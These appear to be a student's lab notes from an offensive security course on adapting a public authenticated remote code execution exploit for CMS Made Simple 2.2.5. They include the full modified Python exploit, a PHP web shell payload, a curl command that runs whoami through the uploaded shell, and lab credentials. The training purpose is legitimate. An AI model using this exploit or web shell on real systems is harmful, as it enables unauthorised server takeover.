
Questions to consider when modifying web exploit:

- Does it initiate an HTTP or HTTPS connection?
- Does it access a specific web application path or route?
- Does the exploit leverage a pre-authentication vulnerability?
- If not, how does the exploit authenticate to the web application?
- How are the GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
- Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
- Will oddities such as self-signed certificates disrupt the exploit?

### Selecting Vulnerability and Fixing Code

##### Scenario

Vulnerability: Linux web server running _CMS Made Simple_ version 2.2.5 on port 443. 

We have valid app credentials: `admin:HUYfaw763`

Public exploit available on ExploitDB: https://www.exploit-db.com/exploits/44976

Goal: Modify exploit code, obtain RCE, upload web shell to gain server control.

Change _base_url_ to match our env. 

Original:
```
base_url = "http://192.168.1.10/cmsms/admin"
```

Modified to match Debian target VM:

```
base_url = "https://192.168.50.120/admin"
```

On target web app, run into the following error:

_SEC_ERROR_UNKNOWN_ISSUER_

Which indicates certificate on remote host can't be validated

To account for this error, modify the post requests in the code to ignore SSL verification (`verify=False`). 

Original:
```
...
    response  = requests.post(url, data=data, allow_redirects=False)
...
    response = requests.post(url, data=data, files=txt, cookies=cookies)
...
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
...
```

Modified:

```hlt:"verify=False"
...
    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
...
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
...
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
...
```

Replace authentication credentials with the valid creds we have. 

```
username = "admin"
password = "HUYfaw763"
```

Modified exploit containing the required changes for our case

```hlt:12,15,16,20,21,34,55,80
# Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution
# Date: 3rd of July, 2018
# Exploit Author: Mustafa Hasan (@strukt93)
# Vendor Homepage: http://www.cmsmadesimple.org/
# Software Link: http://www.cmsmadesimple.org/downloads/cmsms/
# Version: 2.2.5
# CVE: CVE-2018-1000094

import requests
import base64

base_url = "https://10.11.0.128/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin')[0] + upload_dir
username = "admin"
password = "HUYfaw763"

csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]

def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302:
        print "[+] Authenticated successfully with the supplied credentials"
        return response.cookies, parse_csrf_token(response.headers['Location'])
    print "[-] Authentication failed"
    return None, None

def upload_txt(cookies, csrf_token):
    mact = "FileManager,m1_,upload,0"
    page = "/moduleinterface.php"
    url = base_url + page
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "disable_buffer": 1
    }
    txt = {
        'm1_files[]': (txt_filename, payload)
    }
    print "[*] Attempting to upload {}...".format(txt_filename)
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
    status_code = response.status_code
    if status_code == 200:
        print "[+] Successfully uploaded {}".format(txt_filename)
        return True
    print "[-] An error occurred while uploading {}".format(txt_filename)
    return None

def copy_to_php(cookies, csrf_token):
    mact = "FileManager,m1_,fileaction,0"
    page = "/moduleinterface.php"
    url = base_url + page
    b64 = base64.b64encode(txt_filename)
    serialized = 'a:1:{{i:0;s:{}:"{}";}}'.format(len(b64), b64)
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "m1_fileactioncopy": "",
        "m1_path": upload_dir,
        "m1_selall": serialized,
        "m1_destdir": "/",
        "m1_destname": php_filename,
        "m1_submit": "Copy"
    }
    print "[*] Attempting to copy {} to {}...".format(txt_filename, php_filename)
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302:
        if response.headers['Location'].endswith('copysuccess'):
            print "[+] File copied successfully"
            return True
    print "[-] An error occurred while copying, maybe {} already exists".format(php_filename)
    return None    

def quit():
    print "[-] Exploit failed"
    exit()

def run():
    cookies,csrf_token = authenticate()
    if not cookies:
        quit()
    if not upload_txt(cookies, csrf_token):
        quit()
    if not copy_to_php(cookies, csrf_token):
        quit()
    print "[+] Exploit succeeded, shell can be found at: {}".format(upload_url + '/' + php_filename)

run()
```

Results in IndexError

```
 File "44976_modified.py", line 24, in parse_csrf_token
    return location.split(csrf_param + "=")[1]
IndexError: list index out of range
```

##### Troubleshooting "Index Out of Range" Error

Split method used to slice string in location parameter passed to _parse_csrf_token_ function.

Split slices input string using optional separator and stores string slices in a list.

Python string split method

```python
kali@kali:~$ python
...
>>> mystr = "Kali*-*Linux*-*Rocks"

>>> result = mystr.split("*-*")

>>> result
['Kali', 'Linux', 'Rocks']

>>> result[1]
'Linux'
```

In our exploit code, the string separator is defined as the _csrf_param_variable ("__c") followed by the equals sign.

```hlt:1,7
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]
```

Add print statement in _parse_csrf_token_ function. 

```hlt:7
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    print "[+] String that is being split: " + location
    return location.split(csrf_param + "=")[1]
```

The exploit now displays the full string before the split method is invoked.

Result of print statement:

```
[+] String that is being split:
https://10.11.0.128/admin?_sk_=f2946ad9afceb247864
```

There is no `__c` which is defined in the _csrf_param_ variable.

We received `_sk_` from web app.

Changing the csrf_param variable

```
csrf_param = "_sk_"
```

Exploit succeeded.

Verifying if our exploit was successful by trying to execute whoami using the uploaded php shell

`curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami`

Result:
`www-data`

##### LABS:

2. **Capstone Lab**: To put in practice what we learned so far, here is the full vulnerable CMS Made Simple. You recovered the credentials for the admin on this service who is the user _offsec_ with the password _lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ_. Use this information to exploit the service on VM 1 that is running on **http://[IP_ADDRESS]/cmsms** and read **/home/flag.txt** to solve this challenge.

IP: `192.168.134.46`

Error

![[Pasted image 20250126154750.png]]
